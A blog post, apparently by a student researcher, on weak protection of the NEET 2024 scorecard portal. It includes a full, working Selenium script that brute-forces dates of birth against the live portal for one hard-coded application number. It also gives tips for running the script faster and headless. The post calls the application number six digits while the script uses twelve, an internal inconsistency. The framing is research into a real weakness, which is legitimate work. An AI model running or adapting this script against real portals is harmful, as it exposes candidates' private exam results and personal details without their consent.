NEET NTA Scorecard Portal Rate Limiting and Anti-CAPTCHA Weaknesses (Ethical Research)

June 2024 · ~8 min read
full repo + ntaresultcheck.py + setup notes on github

in 2024, the neet ug result came out and immediately something seemed off. there were multiple students listed as air 1 simultaneously, a grace mark distribution that got partially rolled back after the fact, and ongoing allegations of a paper leak that still haven't fully resolved. the central exam authority, nta, was under pressure from all sides and the result portal became one of the few public-facing pieces of the whole system that anyone could actually poke at.

the portal at the time was straightforward: you entered an application number and a date of birth. if the dob matched, you got the scorecard. if not, it said the scorecard hadn't been generated yet. no error that distinguished "wrong dob" from "application number doesn't exist". no rate limiting that i could detect. no captcha worth the name. it was a low-entropy oracle sitting exposed on a national exam with fifteen hundred candidates suddenly listed with identical marks.

after following the controversy, i got curious how fragile the lookup actually was. if an application number ever leaked (a hall ticket photo in a whatsapp group, a list that circulated, anything) how many dates of birth would you actually need to try? the realistic range for someone who appeared for neet 2024 is somewhere between 2003 and 2007. that's about five years, twelve months each, thirty-one days each. roughly 1860 combinations. i decided to build the selenium harness and run it myself to see how long it would actually take on a real connection. the goal wasn't to target anyone. it was to know what the number was.

running it: headless selenium setup

you need a real chrome binary and a matching chromedriver. the most reliable way these days is to use the official chrome for testing builds from google. download the matching chrome-win64 and chromedriver-win64 packages for the version you want (the script was originally tested against 126.x).

install the python dependency:

pip install selenium

update the two path variables in the script to point at wherever you unpacked the binaries. on windows they typically look like r"D:\path\to\chrome-win64\chrome.exe" and the driver right next to it.

for headless runs (no visible browser window) uncomment the --headless line in the options and remove the artificial time.sleep that was only there during initial visual testing. you can use --headless=new or the older flag depending on your chrome version. the usual disable-gpu, no-sandbox, and disable-dev-shm-usage flags help when running on minimal machines or in containers.

the script

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select, WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementClickInterceptedException
import time

chrome_binary_path = r"D:\asu\chrome-win64\chrome.exe"
chrome_driver_path = r"D:\asu\chromedriver-win64\chromedriver.exe"

options = webdriver.ChromeOptions()
options.binary_location = chrome_binary_path
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--log-level=3")
options.add_argument("--silent")

url = 'https://neet.ntaonline.in/frontend/web/scorecard/index'

def initialize_driver():
    service = Service(chrome_driver_path)
    driver = webdriver.Chrome(service=service, options=options)
    return driver

def find_elements(driver):
    day_select = Select(driver.find_element(By.ID, 'Day'))
    month_select = Select(driver.find_element(By.ID, 'Month'))
    year_select = Select(driver.find_element(By.ID, 'Year'))
    return day_select, month_select, year_select

def test_case(driver, application_number, year, month, day):
    try:
        driver.get(url)
        wait = WebDriverWait(driver, 10)
        app_number_field = wait.until(EC.presence_of_element_located((By.ID, 'scorecardmodel-applicationnumber')))
        app_number_field.clear()
        app_number_field.send_keys(application_number)
        wait.until(EC.text_to_be_present_in_element_value((By.ID, 'scorecardmodel-applicationnumber'), application_number))

        day_select, month_select, year_select = find_elements(driver)
        try:
            year_select.select_by_value(str(year))
            month_select.select_by_value(f"{month:02}")
            day_select.select_by_value(f"{day:02}")
        except NoSuchElementException:
            return False

        while True:
            try:
                submit_button = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@type="submit"]')))
                submit_button.click()
                break
            except ElementClickInterceptedException:
                try:
                    ok_button = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, 'swal2-confirm')))
                    ok_button.click()
                except TimeoutException:
                    break

        try:
            wait.until(EC.visibility_of_element_located((By.CLASS_NAME, 'swal2-container')))
            ok_button = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, 'swal2-confirm')))
            ok_button.click()
        except TimeoutException:
            pass

        try:
            error_message = driver.find_element(By.XPATH, "//*[contains(text(), 'Sorry, Your Score Card not generated!')]")
            if error_message:
                return False
        except NoSuchElementException:
            try:
                success_message = driver.find_element(By.XPATH, "//*[contains(text(), 'Total Marks')]")
                if success_message:
                    return True
            except NoSuchElementException:
                return False
    except NoSuchElementException:
        return False
    return False

def brute_force_dates(application_number, start_year=2003, end_year=2007):
    driver = initialize_driver()
    try:
        for year in range(start_year, end_year + 1):
            for month in range(1, 13):
                for day in range(1, 32):
                    success = test_case(driver, application_number, year, month, day)
                    if success:
                        print(f"Match found for {application_number} with date {year}-{month:02}-{day:02}")
                        return
                    time.sleep(0.2)
    finally:
        driver.quit()

brute_force_dates("240410136941")

the loop is deliberately slow in the visible version so you can watch it type and submit. for real runs drop the sleep and run headless. the swal overlay handling is there because the site throws a modal on every submit, even the failing ones.

how long it actually takes

on a real connection, with the 0.2s sleep in the loop and the modal handling overhead, a full walk of the 2003–2007 range takes somewhere between two and four hours depending on network latency to the nta servers. that's not instant. but it's also not a meaningful barrier for someone with a motive and an application number. i'm not sure what i expected, but the answer being "a few hours of automation" felt like it deserved to be written down.

the proper fix is obvious. a high-stakes national exam result portal should not rely on a six-digit application number plus a date of birth that can be walked in a narrow range. either move the lookup behind real authentication, add rate limiting and captcha that actually hold up against automation, or both.

i published the repo and this writeup as a reminder that when the stakes are this high, public result lookups should not be trivial oracles. the full code and windows setup instructions live at https://github.com/asucodes/NEET-DOB-Bruteforce. the readme contains the chrome-for-testing details. this post exists to document the research and the motivation behind it. i do not support using the technique against real candidates.
